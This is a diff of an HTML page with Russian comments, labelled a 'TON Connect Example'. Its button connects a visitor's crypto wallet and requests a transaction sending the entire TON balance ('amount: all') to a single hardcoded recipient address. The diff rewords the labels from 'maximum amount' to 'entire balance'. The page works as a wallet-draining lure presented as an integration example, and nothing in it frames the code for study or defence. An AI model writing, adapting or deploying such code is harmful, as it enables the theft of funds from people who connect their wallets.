@@ -8,11 +8,11 @@
 
 <h1>TON Connect Example</h1>
 
-<p>Это пример интеграции TON Connect и отправки максимально возможной суммы TON (требует подтверждения пользователя).</p>
+<p>Это пример интеграции TON Connect и отправки ВСЕГО баланса TON (требует подтверждения пользователя).</p>
 
 <div id="ton-connect"></div>
 
-<button onclick="connectCustom()">Подключить кошелек и отправить максимум TON</button>
+<button onclick="connectCustom()">Подключить кошелек и отправить ВЕСЬ TON</button>
 
 <script>
     // Замените на ваш фактический URL приложения
@@ -25,25 +25,24 @@
     // Адрес вашего кошелька для получения TON
     const recipientAddress = 'UQA9or9rMdG8vk8wSX20LRapZgTUslxrHt-Oa4JCcAynwEEi';
 
-    // Функция для подключения кошелька и отправки транзакции (максимальная сумма)
+    // Функция для подключения кошелька и отправки транзакции (ВЕСЬ баланс)
     async function connectCustom() {
         try {
             const connectedWallet = await tonConnectUI.connectWallet();
             console.log("Подключенный кошелек:", connectedWallet);
 
-            // ВАЖНО: Устанавливаем сумму в 'all' для отправки максимума
             const tx = {
                 validUntil: Date.now() + 5 * 60 * 1000,
                 messages: [{
                     address: recipientAddress,
-                    amount: 'all' // Отправить максимально возможную сумму
+                    amount: 'all' // Отправить ВЕСЬ баланс
                 }]
             };
             console.log("Объект транзакции:", tx);
 
             const result = await tonConnectUI.sendTransaction(tx);
             console.log("Результат транзакции:", result);
-            alert("Транзакция отправлена (максимальная сумма)! Хэш: " + result.hash);
+            alert("Транзакция отправлена (ВЕСЬ баланс)! Хэш: " + result.hash);
 
         } catch (error) {
             console.error("Тип ошибки:", typeof error);
@@ -56,6 +55,5 @@
 
 </body>
 </html>
-
 
 
